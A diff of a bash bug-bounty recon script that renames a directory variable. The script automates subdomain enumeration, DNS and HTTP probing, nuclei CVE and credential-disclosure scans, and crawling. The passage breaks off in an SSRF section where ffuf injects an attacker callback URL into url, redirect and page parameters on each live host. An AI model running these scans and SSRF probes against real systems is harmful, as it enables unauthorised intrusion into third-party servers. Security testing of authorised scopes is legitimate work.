@@ -49,45 +49,45 @@ quiet= # quiet mode
 # definitions
 enumeratesubdomains(){
   if [ "$single" = "1" ]; then
-    echo $1 > $targetDir/enumerated-subdomains.txt
+    echo $1 > $TARGETDIR/enumerated-subdomains.txt
   elif [ "$cidr" = "1" ]; then
-    mapcidr -silent -cidr $1 -o $targetDir/enumerated-subdomains.txt
+    mapcidr -silent -cidr $1 -o $TARGETDIR/enumerated-subdomains.txt
   elif [ "$list" = "1" ]; then
-    cp $1 $targetDir/enumerated-subdomains.txt
+    cp $1 $TARGETDIR/enumerated-subdomains.txt
   else
     echo "Enumerating all known domains using:"
 
     # Passive subdomain enumeration
     echo "subfinder..."
-    echo $1 >> $targetDir/subfinder-list.txt # to be sure main domain added in case of one domain scope
-    subfinder -d $1 -silent -o $targetDir/subfinder-list.txt &
+    echo $1 >> $TARGETDIR/subfinder-list.txt # to be sure main domain added in case of one domain scope
+    subfinder -d $1 -silent -o $TARGETDIR/subfinder-list.txt &
     pid1=$!
 
     echo "assetfinder..."
-    assetfinder --subs-only $1 > $targetDir/assetfinder-list.txt &
+    assetfinder --subs-only $1 > $TARGETDIR/assetfinder-list.txt &
     pid2=$!
 
     echo "github-subdomains.py..."
-    github-subdomains -d $1 -t $GITHUBTOKEN | sed "s/^\.//;/error/d" > $targetDir/github-subdomains-list.txt
+    github-subdomains -d $1 -t $GITHUBTOKEN | sed "s/^\.//;/error/d" > $TARGETDIR/github-subdomains-list.txt
 
     wait $pid1 $pid2
 
     # echo "amass..."
-    # amass enum --passive -log $targetDir/amass_errors.log -d $1 -o $targetDir/amass-list.txt
+    # amass enum --passive -log $TARGETDIR/amass_errors.log -d $1 -o $TARGETDIR/amass-list.txt
 
     # remove all lines start with *-asterix and out-of-scope domains
     SCOPE=$1
-    grep "[.]${SCOPE}$" $targetDir/assetfinder-list.txt | sort -u -o $targetDir/assetfinder-list.txt
-    sed "${SEDOPTION[@]}" '/^*/d' $targetDir/assetfinder-list.txt
+    grep "[.]${SCOPE}$" $TARGETDIR/assetfinder-list.txt | sort -u -o $TARGETDIR/assetfinder-list.txt
+    sed "${SEDOPTION[@]}" '/^*/d' $TARGETDIR/assetfinder-list.txt
     # sort enumerated subdomains
-    sort -u $targetDir/subfinder-list.txt $targetDir/assetfinder-list.txt $targetDir/github-subdomains-list.txt -o $targetDir/enumerated-subdomains.txt
-    sed "${SEDOPTION[@]}" '/^[.]/d' $targetDir/enumerated-subdomains.txt
+    sort -u $TARGETDIR/subfinder-list.txt $TARGETDIR/assetfinder-list.txt $TARGETDIR/github-subdomains-list.txt -o $TARGETDIR/enumerated-subdomains.txt
+    sed "${SEDOPTION[@]}" '/^[.]/d' $TARGETDIR/enumerated-subdomains.txt
   fi
 }
 
 getwaybackurl(){
   echo "waybackurls..."
-  cat $targetDir/enumerated-subdomains.txt | waybackurls | sort | uniq | qsreplace -a > $targetDir/wayback/waybackurls_output.txt
+  cat $TARGETDIR/enumerated-subdomains.txt | waybackurls | sort | uniq | qsreplace -a > $TARGETDIR/wayback/waybackurls_output.txt
   echo "waybackurls done"
 }
 getgau(){
@@ -97,12 +97,12 @@ getgau(){
     SUBS="-subs"
   fi
   # gau -subs mean include subdomains
-  cat $targetDir/enumerated-subdomains.txt | gau $SUBS | sort | uniq | qsreplace -a > $targetDir/wayback/gau_output.txt
+  cat $TARGETDIR/enumerated-subdomains.txt | gau $SUBS | sort | uniq | qsreplace -a > $TARGETDIR/wayback/gau_output.txt
   echo "gau done"
 }
 getgithubendpoints(){
   echo "github-endpoints.py..."
-  github-endpoints -d $1 -t $GITHUBTOKEN | sort | uniq | qsreplace -a > $targetDir/wayback/github-endpoints_out.txt
+  github-endpoints -d $1 -t $GITHUBTOKEN | sort | uniq | qsreplace -a > $TARGETDIR/wayback/github-endpoints_out.txt
   echo "github-endpoints done"
 }
 
@@ -119,51 +119,51 @@ checkwaybackurls(){
 
   wait $pid_1 $pid_2
 
-  sort -u $targetDir/wayback/gau_output.txt $targetDir/wayback/waybackurls_output.txt $targetDir/wayback/github-endpoints_out.txt -o $targetDir/wayback/wayback_output.txt
+  sort -u $TARGETDIR/wayback/gau_output.txt $TARGETDIR/wayback/waybackurls_output.txt $TARGETDIR/wayback/github-endpoints_out.txt -o $TARGETDIR/wayback/wayback_output.txt
   # teardown: remove raw files
-  # rm -rf $targetDir/wayback/gau_output.txt $targetDir/wayback/waybackurls_output.txt $targetDir/wayback/github-endpoints_out.txt
+  # rm -rf $TARGETDIR/wayback/gau_output.txt $TARGETDIR/wayback/waybackurls_output.txt $TARGETDIR/wayback/github-endpoints_out.txt
 
   # remove all out-of-scope lines
-  # grep -e "[.]${SCOPE}" -e "//${SCOPE}" $targetDir/wayback/wayback_output.txt | sort -u -o $targetDir/wayback/wayback_output.txt
+  # grep -e "[.]${SCOPE}" -e "//${SCOPE}" $TARGETDIR/wayback/wayback_output.txt | sort -u -o $TARGETDIR/wayback/wayback_output.txt
 
   # need to get some extras subdomains
-  cat $targetDir/wayback/wayback_output.txt | unfurl --unique domains | sed '/web.archive.org/d' > $targetDir/wayback-subdomains-list.txt
+  cat $TARGETDIR/wayback/wayback_output.txt | unfurl --unique domains | sed '/web.archive.org/d' > $TARGETDIR/wayback-subdomains-list.txt
 
   # full paths+queries
   # remove archive and potential emails
-  # cat $targetDir/wayback/wayback_output.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d;/web.archive.org/d;/@/d' | sort | uniq > $targetDir/wayback/wayback-paths-list.txt
+  # cat $TARGETDIR/wayback/wayback_output.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d;/web.archive.org/d;/@/d' | sort | uniq > $TARGETDIR/wayback/wayback-paths-list.txt
 
   if [ "$alt" = "1" -a "$mad" = "1" ]; then
     # prepare target specific subdomains wordlist to gain more subdomains using --mad mode
-    cat $targetDir/wayback/wayback_output.txt | unfurl format %S | sort | uniq > $targetDir/wayback-subdomains-wordlist.txt
-    sort -u $altdnsWordlist $targetDir/wayback-subdomains-wordlist.txt -o $customSubdomainsWordList
+    cat $TARGETDIR/wayback/wayback_output.txt | unfurl format %S | sort | uniq > $TARGETDIR/wayback-subdomains-wordlist.txt
+    sort -u $altdnsWordlist $TARGETDIR/wayback-subdomains-wordlist.txt -o $customSubdomainsWordList
   fi
 }
 
 sortsubdomains(){
-  sort -u $targetDir/enumerated-subdomains.txt $targetDir/wayback-subdomains-list.txt -o $targetDir/1-real-subdomains.txt
-  cp $targetDir/1-real-subdomains.txt $targetDir/2-all-subdomains.txt
+  sort -u $TARGETDIR/enumerated-subdomains.txt $TARGETDIR/wayback-subdomains-list.txt -o $TARGETDIR/1-real-subdomains.txt
+  cp $TARGETDIR/1-real-subdomains.txt $TARGETDIR/2-all-subdomains.txt
 }
 
 permutatesubdomains(){
   if [ "$alt" = "1" ]; then
-    mkdir $targetDir/alterated/
+    mkdir $TARGETDIR/alterated/
     echo "altdns..."
-    altdns -i $targetDir/1-real-subdomains.txt -o $targetDir/alterated/altdns_out.txt -w $customSubdomainsWordList
-    sed "${SEDOPTION[@]}" '/^[.]/d;/^[-]/d;/\.\./d' $targetDir/alterated/altdns_out.txt
+    altdns -i $TARGETDIR/1-real-subdomains.txt -o $TARGETDIR/alterated/altdns_out.txt -w $customSubdomainsWordList
+    sed "${SEDOPTION[@]}" '/^[.]/d;/^[-]/d;/\.\./d' $TARGETDIR/alterated/altdns_out.txt
 
     echo "dnsgen..."
-    dnsgen -f $targetDir/1-real-subdomains.txt -w $customSubdomainsWordList > $targetDir/alterated/dnsgen_out.txt
-    sed "${SEDOPTION[@]}" '/^[.]/d;/^[-]/d;/\.\./d' $targetDir/alterated/dnsgen_out.txt
-    sed "${SEDOPTION[@]}" '/^[-]/d' $targetDir/alterated/dnsgen_out.txt
+    dnsgen -f $TARGETDIR/1-real-subdomains.txt -w $customSubdomainsWordList > $TARGETDIR/alterated/dnsgen_out.txt
+    sed "${SEDOPTION[@]}" '/^[.]/d;/^[-]/d;/\.\./d' $TARGETDIR/alterated/dnsgen_out.txt
+    sed "${SEDOPTION[@]}" '/^[-]/d' $TARGETDIR/alterated/dnsgen_out.txt
 
     # combine permutated domains and exclude out of scope domains
     SCOPE=$1
     echo "SCOPE=$SCOPE"
-    grep -r -h "[.]${SCOPE}$" $targetDir/alterated | sort | uniq > $targetDir/alterated/permutated-list.txt
+    grep -r -h "[.]${SCOPE}$" $TARGETDIR/alterated | sort | uniq > $TARGETDIR/alterated/permutated-list.txt
 
-    sort -u $targetDir/1-real-subdomains.txt $targetDir/alterated/permutated-list.txt -o $targetDir/2-all-subdomains.txt
-    rm -rf $targetDir/alterated/*
+    sort -u $TARGETDIR/1-real-subdomains.txt $TARGETDIR/alterated/permutated-list.txt -o $TARGETDIR/2-all-subdomains.txt
+    rm -rf $TARGETDIR/alterated/*
   fi
 }
 
@@ -176,42 +176,42 @@ dnsprobing(){
   if [[ -n $ip ]]; then
     echo
     echo "[dnsx] try to get PTR records"
-    echo $1 > $targetDir/dnsprobe_ip.txt
-    echo $1 | dnsx -silent -ptr -resp-only -o $targetDir/dnsprobe_subdomains.txt # also try to get subdomains
+    echo $1 > $TARGETDIR/dnsprobe_ip.txt
+    echo $1 | dnsx -silent -ptr -resp-only -o $TARGETDIR/dnsprobe_subdomains.txt # also try to get subdomains
   elif [[ -n $cidr ]]; then
     echo "[dnsx] try to get PTR records"
-    cp  $targetDir/enumerated-subdomains.txt $targetDir/dnsprobe_ip.txt
-    dnsx -silent -ptr -resp-only -r $miniResolvers -l $targetDir/dnsprobe_ip.txt -o $targetDir/dnsprobe_subdomains.txt # also try to get subdomains
+    cp  $TARGETDIR/enumerated-subdomains.txt $TARGETDIR/dnsprobe_ip.txt
+    dnsx -silent -ptr -resp-only -r $miniResolvers -l $TARGETDIR/dnsprobe_ip.txt -o $TARGETDIR/dnsprobe_subdomains.txt # also try to get subdomains
   elif [ "$single" = "1" ]; then
-    echo $1 | dnsx -silent -a -resp-only -o $targetDir/dnsprobe_ip.txt
-    echo $1 > $targetDir/dnsprobe_subdomains.txt
+    echo $1 | dnsx -silent -a -resp-only -o $TARGETDIR/dnsprobe_ip.txt
+    echo $1 > $TARGETDIR/dnsprobe_subdomains.txt
   elif [[ -n $list ]]; then
       echo "[shuffledns] massdns probing..."
-      shuffledns -silent -list $targetDir/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $targetDir/shuffledns-list.txt
+      shuffledns -silent -list $TARGETDIR/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $TARGETDIR/shuffledns-list.txt
       # additional resolving because shuffledns missing IP on output
       echo "[dnsx] getting hostnames and its A records:"
       # -t mean cuncurrency
-      dnsx -silent -t 250 -a -resp -r $miniResolvers -l $targetDir/shuffledns-list.txt -o $targetDir/dnsprobe_out.txt
+      dnsx -silent -t 250 -a -resp -r $miniResolvers -l $TARGETDIR/shuffledns-list.txt -o $TARGETDIR/dnsprobe_out.txt
       # clear file from [ and ] symbols
-      tr -d '\[\]' < $targetDir/dnsprobe_out.txt > $targetDir/dnsprobe_output_tmp.txt
+      tr -d '\[\]' < $TARGETDIR/dnsprobe_out.txt > $TARGETDIR/dnsprobe_output_tmp.txt
       # split resolved hosts ans its IP (for masscan)
-      cut -f1 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_subdomains.txt
-      cut -f2 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_ip.txt
+      cut -f1 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_subdomains.txt
+      cut -f2 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_ip.txt
   else
       echo "[shuffledns] massdns probing with wildcard sieving..."
-      shuffledns -silent -d $1 -list $targetDir/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $targetDir/shuffledns-list.txt
+      shuffledns -silent -d $1 -list $TARGETDIR/2-all-subdomains.txt -retries 1 -r $miniResolvers -o $TARGETDIR/shuffledns-list.txt
       # additional resolving because shuffledns missing IP on output
       # echo "[dnsx] dnsprobing..."
       # echo "[dnsx] wildcard filtering:"
-      # dnsx -l $targetDir/shuffledns-list.txt -wd $1 -o $targetDir/dnsprobe_live.txt
+      # dnsx -l $TARGETDIR/shuffledns-list.txt -wd $1 -o $TARGETDIR/dnsprobe_live.txt
       echo "[dnsx] getting hostnames and its A records:"
       # -t mean cuncurrency
-      dnsx -silent -t 250 -a -resp -r $miniResolvers -l $targetDir/shuffledns-list.txt -o $targetDir/dnsprobe_out.txt
+      dnsx -silent -t 250 -a -resp -r $miniResolvers -l $TARGETDIR/shuffledns-list.txt -o $TARGETDIR/dnsprobe_out.txt
       # clear file from [ and ] symbols
-      tr -d '\[\]' < $targetDir/dnsprobe_out.txt > $targetDir/dnsprobe_output_tmp.txt
+      tr -d '\[\]' < $TARGETDIR/dnsprobe_out.txt > $TARGETDIR/dnsprobe_output_tmp.txt
       # split resolved hosts ans its IP (for masscan)
-      cut -f1 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_subdomains.txt
-      cut -f2 -d ' ' $targetDir/dnsprobe_output_tmp.txt | sort | uniq > $targetDir/dnsprobe_ip.txt
+      cut -f1 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_subdomains.txt
+      cut -f2 -d ' ' $TARGETDIR/dnsprobe_output_tmp.txt | sort | uniq > $TARGETDIR/dnsprobe_ip.txt
   fi
 }
 
@@ -221,18 +221,18 @@ checkhttprobe(){
   # resolve IP and hosts with http|https for nuclei, aquatone, gospider, ssrf and ffuf-bruteforce
   if [[ -n $ip || -n $cidr ]]; then
     echo "[httpx] IP probe testing..."
-    httpx -silent -ports 80,443,4444,8000,8001,8008,8080,8443,8888 -l $targetDir/dnsprobe_ip.txt -follow-host-redirects -threads 150 -o $targetDir/3-all-subdomain-live-scheme.txt
+    httpx -silent -ports 80,443,4444,8000,8001,8008,8080,8443,8888 -l $TARGETDIR/dnsprobe_ip.txt -follow-host-redirects -threads 150 -o $TARGETDIR/3-all-subdomain-live-scheme.txt
   else
-    httpx -silent -ports 80,443,4444,8000,8001,8008,8080,8443,8888 -l $targetDir/dnsprobe_subdomains.txt -follow-host-redirects -threads 150 -o $targetDir/3-all-subdomain-live-scheme.txt
+    httpx -silent -ports 80,443,4444,8000,8001,8008,8080,8443,8888 -l $TARGETDIR/dnsprobe_subdomains.txt -follow-host-redirects -threads 150 -o $TARGETDIR/3-all-subdomain-live-scheme.txt
   fi
 
-  # sort -u $targetDir/httpx_output_1.txt $targetDir/httpx_output_2.txt -o $targetDir/3-all-subdomain-live-scheme.txt
-  cat $targetDir/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $targetDir/3-all-subdomain-live.txt
+  # sort -u $TARGETDIR/httpx_output_1.txt $TARGETDIR/httpx_output_2.txt -o $TARGETDIR/3-all-subdomain-live-scheme.txt
+  cat $TARGETDIR/3-all-subdomain-live-scheme.txt | unfurl format '%d:%P' > $TARGETDIR/3-all-subdomain-live.txt
 }
 
 screenshots(){
-  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
-    mkdir $targetDir/screenshots
+  if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
+    mkdir $TARGETDIR/screenshots
       # to handle background PID
         declare -a pid_array
         ITERATOR=0
@@ -240,7 +240,7 @@ screenshots(){
           ./helpers/getscreenshot.sh "$line" &
           pid_array[ITERATOR]=$!
           ITERATOR=$((ITERATOR+1))
-        done < $targetDir/3-all-subdomain-live-scheme.txt
+        done < $TARGETDIR/3-all-subdomain-live-scheme.txt
 
         jobs -l
         for pid in "${!pid_array[@]}"; do
@@ -249,19 +249,19 @@ screenshots(){
             echo "_${pid_array[$pid]} done_"
         done
 
-        mv ./*.png $targetDir/screenshots/
-        chown $HOMEUSER: $targetDir/screenshots/*
+        mv ./*.png $TARGETDIR/screenshots/
+        chown $HOMEUSER: $TARGETDIR/screenshots/*
   fi
 }
 
 nucleitest(){
-  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
+  if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
     echo "[nuclei] CVE testing..."
     # -c maximum templates processed in parallel
-    nuclei -silent -l $targetDir/3-all-subdomain-live-scheme.txt -t $HOMEDIR/nuclei-templates/technologies/ -o $targetDir/nuclei/nuclei_output_technology.txt
+    nuclei -silent -l $TARGETDIR/3-all-subdomain-live-scheme.txt -t $HOMEDIR/nuclei-templates/technologies/ -o $TARGETDIR/nuclei/nuclei_output_technology.txt
     sleep 1
-    nuclei -silent -stats -l $targetDir/3-all-subdomain-live-scheme.txt \
+    nuclei -silent -stats -l $TARGETDIR/3-all-subdomain-live-scheme.txt \
                     -t $HOMEDIR/nuclei-templates/vulnerabilities/ \
                     -t $HOMEDIR/nuclei-templates/cves/2014/ \
                     -t $HOMEDIR/nuclei-templates/cves/2015/ \
@@ -286,67 +286,67 @@ nucleitest(){
                     -t $HOMEDIR/nuclei-templates/exposed-tokens/generic/credentials-disclosure.yaml \
                     -t $HOMEDIR/nuclei-templates/exposed-tokens/generic/general-tokens.yaml \
                     -t $HOMEDIR/nuclei-templates/fuzzing/ \
-                    -o $targetDir/nuclei/nuclei_output.txt
+                    -o $TARGETDIR/nuclei/nuclei_output.txt
 
-    if [ -s $targetDir/nuclei/nuclei_output.txt ]; then
-      cut -f4 -d ' ' $targetDir/nuclei/nuclei_output.txt | unfurl paths | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $targetDir/nuclei/nuclei_unfurl_paths.txt
+    if [ -s $TARGETDIR/nuclei/nuclei_output.txt ]; then
+      cut -f4 -d ' ' $TARGETDIR/nuclei/nuclei_output.txt | unfurl paths | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $TARGETDIR/nuclei/nuclei_unfurl_paths.txt
       # filter first and first-second paths from full paths and remove empty lines
-      cut -f1 -d '/' $targetDir/nuclei/nuclei_unfurl_paths.txt | sed '/^$/d' | sort | uniq > $targetDir/nuclei/nuclei_paths.txt
-      cut -f1-2 -d '/' $targetDir/nuclei/nuclei_unfurl_paths.txt | sed '/^$/d' | sort | uniq >> $targetDir/nuclei/nuclei_paths.txt
+      cut -f1 -d '/' $TARGETDIR/nuclei/nuclei_unfurl_paths.txt | sed '/^$/d' | sort | uniq > $TARGETDIR/nuclei/nuclei_paths.txt
+      cut -f1-2 -d '/' $TARGETDIR/nuclei/nuclei_unfurl_paths.txt | sed '/^$/d' | sort | uniq >> $TARGETDIR/nuclei/nuclei_paths.txt
 
       # full paths+queries
-      cut -f4 -d ' ' $targetDir/nuclei/nuclei_output.txt | unfurl format '%p%?%q' | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $targetDir/nuclei/nuclei_paths_queries.txt
-      sort -u $targetDir/nuclei/nuclei_unfurl_paths.txt $targetDir/nuclei/nuclei_paths.txt $targetDir/nuclei/nuclei_paths_queries.txt -o $targetDir/nuclei/nuclei-paths-list.txt
+      cut -f4 -d ' ' $TARGETDIR/nuclei/nuclei_output.txt | unfurl format '%p%?%q' | sed 's/^\///;s/\/$//;/^$/d' | sort | uniq > $TARGETDIR/nuclei/nuclei_paths_queries.txt
+      sort -u $TARGETDIR/nuclei/nuclei_unfurl_paths.txt $TARGETDIR/nuclei/nuclei_paths.txt $TARGETDIR/nuclei/nuclei_paths_queries.txt -o $TARGETDIR/nuclei/nuclei-paths-list.txt
     fi
   fi
 }
 
 gospidertest(){
-  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
+  if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     SCOPE=$1
     echo
     echo "[gospider] Web crawling..."
-    gospider -q -r -S $targetDir/3-all-subdomain-live-scheme.txt --timeout 7 -o $targetDir/gospider -c 40 -t 40 1> /dev/null
+    gospider -q -r -S $TARGETDIR/3-all-subdomain-live-scheme.txt --timeout 7 -o $TARGETDIR/gospider -c 40 -t 40 1> /dev/null
 
     # combine the results and filter out of scope
-    cat $targetDir/gospider/* > $targetDir/gospider_raw_out.txt # make sure out not in same dir avoid infinit loop
-    # for X in $targetDir/gospider/*
+    cat $TARGETDIR/gospider/* > $TARGETDIR/gospider_raw_out.txt # make sure out not in same dir avoid infinit loop
+    # for X in $TARGETDIR/gospider/*
     #   do
-    #     cat "$X" | grep $1 >> $targetDir/gospider/gospider_raw_out.txt
+    #     cat "$X" | grep $1 >> $TARGETDIR/gospider/gospider_raw_out.txt
     #   done
 
     # prepare paths list
-    grep -e '\[form\]' -e '\[javascript\]' -e '\[linkfinder\]' -e '\[robots\]'  $targetDir/gospider_raw_out.txt | cut -f3 -d ' ' | grep "${SCOPE}" | sort | uniq > $targetDir/gospider/gospider_out.txt
-    grep '\[url\]' $targetDir/gospider_raw_out.txt | cut -f5 -d ' ' | grep "${SCOPE}" | sort | uniq >> $targetDir/gospider/gospider_out.txt
-    # rm -rf $targetDir/gospider/gospider_out.txt
+    grep -e '\[form\]' -e '\[javascript\]' -e '\[linkfinder\]' -e '\[robots\]'  $TARGETDIR/gospider_raw_out.txt | cut -f3 -d ' ' | grep "${SCOPE}" | sort | uniq > $TARGETDIR/gospider/gospider_out.txt
+    grep '\[url\]' $TARGETDIR/gospider_raw_out.txt | cut -f5 -d ' ' | grep "${SCOPE}" | sort | uniq >> $TARGETDIR/gospider/gospider_out.txt
+    # rm -rf $TARGETDIR/gospider/gospider_out.txt
 
     # full paths+queries
-    # cat $targetDir/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d;/web.archive.org/d;/@/d' | sort | uniq > $targetDir/gospider/gospider-paths-list.txt
+    # cat $TARGETDIR/gospider/gospider_out.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d;/web.archive.org/d;/@/d' | sort | uniq > $TARGETDIR/gospider/gospider-paths-list.txt
   fi
 }
 
 hakrawlercrawling(){
-  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
+  if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
     echo "[hakrawler] Web crawling..."
-    cat $targetDir/3-all-subdomain-live-scheme.txt | hakrawler -plain -insecure -depth 3 > $targetDir/hakrawler/hakrawler_out.txt
+    cat $TARGETDIR/3-all-subdomain-live-scheme.txt | hakrawler -plain -insecure -depth 3 > $TARGETDIR/hakrawler/hakrawler_out.txt
 
     # prepare paths
-    # cat $targetDir/hakrawler/hakrawler_out.txt | unfurl paths | sed 's/\///;/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt
+    # cat $TARGETDIR/hakrawler/hakrawler_out.txt | unfurl paths | sed 's/\///;/^$/d' | sort | uniq > $TARGETDIR/hakrawler/hakrawler_unfurl_paths_out.txt
     # filter first and first-second paths from full paths and remove empty lines
-    # cut -f1 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler_paths.txt
-    # cut -f1-2 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/hakrawler/hakrawler_paths.txt
-    # cut -f1-3 -d '/' $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $targetDir/hakrawler/hakrawler_paths.txt
+    # cut -f1 -d '/' $TARGETDIR/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq > $TARGETDIR/hakrawler/hakrawler_paths.txt
+    # cut -f1-2 -d '/' $TARGETDIR/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $TARGETDIR/hakrawler/hakrawler_paths.txt
+    # cut -f1-3 -d '/' $TARGETDIR/hakrawler/hakrawler_unfurl_paths_out.txt | sed '/^$/d' | sort | uniq >> $TARGETDIR/hakrawler/hakrawler_paths.txt
 
     # full paths+queries
-    cat $targetDir/hakrawler/hakrawler_out.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d' | sort | uniq > $targetDir/hakrawler/hakrawler-paths-list.txt
+    cat $TARGETDIR/hakrawler/hakrawler_out.txt | unfurl format '%p%?%q' | sed 's/^\///;/^$/d' | sort | uniq > $TARGETDIR/hakrawler/hakrawler-paths-list.txt
 
-    # sort -u $targetDir/hakrawler/hakrawler-paths-list.txt -o $targetDir/hakrawler/hakrawler-paths-list.txt
-    # chown $HOMEUSER: $targetDir/hakrawler/hakrawler-paths-list.txt
+    # sort -u $TARGETDIR/hakrawler/hakrawler-paths-list.txt -o $TARGETDIR/hakrawler/hakrawler-paths-list.txt
+    # chown $HOMEUSER: $TARGETDIR/hakrawler/hakrawler-paths-list.txt
 
-    # sort -u $targetDir/hakrawler/hakrawler_unfurl_paths_out.txt $targetDir/hakrawler/hakrawler_paths.txt $targetDir/hakrawler/hakrawler_paths_queries.txt -o $targetDir/hakrawler/hakrawler-paths-list.txt
+    # sort -u $TARGETDIR/hakrawler/hakrawler_unfurl_paths_out.txt $TARGETDIR/hakrawler/hakrawler_paths.txt $TARGETDIR/hakrawler/hakrawler_paths_queries.txt -o $TARGETDIR/hakrawler/hakrawler-paths-list.txt
     # remove .jpg .jpeg .webp .png .svg .gif from paths
-    # sed "${SEDOPTION[@]}" $unwantedpaths $targetDir/hakrawler/hakrawler-paths-list.txt
+    # sed "${SEDOPTION[@]}" $unwantedpaths $TARGETDIR/hakrawler/hakrawler-paths-list.txt
   fi
 }
 
@@ -357,13 +357,13 @@ custompathlist(){
   if [ "$mad" = "1" ]; then
     echo
     echo "Prepare custom queryList"
-    sort -u $targetDir/wayback/wayback_output.txt $targetDir/gospider/gospider_out.txt -o $queryList
-    # rm -rf $targetDir/wayback/wayback_output.txt
+    sort -u $TARGETDIR/wayback/wayback_output.txt $TARGETDIR/gospider/gospider_out.txt -o $queryList
+    # rm -rf $TARGETDIR/wayback/wayback_output.txt
 
     # echo "Prepare custom customFfufWordList"
     # merge base dirsearchWordlist with target-specific list for deep dive (time sensitive)
-    # sudo sort -u $targetDir/nuclei/nuclei-paths-list.txt $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt $targetDir/hakrawler/hakrawler-paths-list.txt $customFfufWordList -o $customFfufWordList
-    # sort -u $targetDir/wayback/wayback-paths-list.txt $targetDir/gospider/gospider-paths-list.txt -o $customFfufWordList
+    # sudo sort -u $TARGETDIR/nuclei/nuclei-paths-list.txt $TARGETDIR/wayback/wayback-paths-list.txt $TARGETDIR/gospider/gospider-paths-list.txt $TARGETDIR/hakrawler/hakrawler-paths-list.txt $customFfufWordList -o $customFfufWordList
+    # sort -u $TARGETDIR/wayback/wayback-paths-list.txt $TARGETDIR/gospider/gospider-paths-list.txt -o $customFfufWordList
 
     # GREPSCOPE=$(echo $1 | sed "s/\./[.]/")
     # grep -E  "https?[^\"\\'> ]+|www[.][^\"\\'> ]+" $queryList | sed "s|%3A|:|gi;s|%2F|\/|gi;s|%253A|:|gi;s|%252F|\/|gi;s|%25253A|:|gi;s|%25252F|\/|gi" | uniq > $customPathWordList
@@ -390,57 +390,57 @@ custompathlist(){
 # https://notifybugme.medium.com/finding-ssrf-by-full-automation-7d2680091d68
 # https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF
 ssrftest(){
-  if [ -s $targetDir/3-all-subdomain-live-scheme.txt ]; then
+  if [ -s $TARGETDIR/3-all-subdomain-live-scheme.txt ]; then
     echo
     echo "[SSRF-1] Headers..."
-    ssrf-headers-tool $targetDir/3-all-subdomain-live-scheme.txt $ATTACKER > /dev/null
+    ssrf-headers-tool $TARGETDIR/3-all-subdomain-live-scheme.txt $ATTACKER > /dev/null
 
     echo
     echo "[SSRF-2] Blind probe..."
     # /?url=
     ffuf -s -c -r -u HOST/\?url=$ATTACKERURL/DOMAIN \
-        -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-        -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+        -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+        -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # index.php?url=
     # ffuf -s -c -u HOST/index.php\?url=$ATTACKERURL/DOMAIN/url \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?uri=
     # ffuf -s -c -u HOST/\?uri=$ATTACKERURL/DOMAIN/ \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?redirect_to=
     # ffuf -s -c -u HOST/\?redirect_to=$ATTACKER/DOMAIN/ \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
-    #     -w $targetDir/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
+    #     -w $TARGETDIR/3-all-subdomain-live-scheme.txt:HOST \
+    #     -w $TARGETDIR/3-all-subdomain-live.txt:DOMAIN -mode pitchfork
 
     # # /?page=
     # ffuf -s -c -u HOST/\?page=$ATTACKER/DOMAIN/ \
-    #     -w $targetDir/3-all-subdomain-live-scheme.txt:HOST \
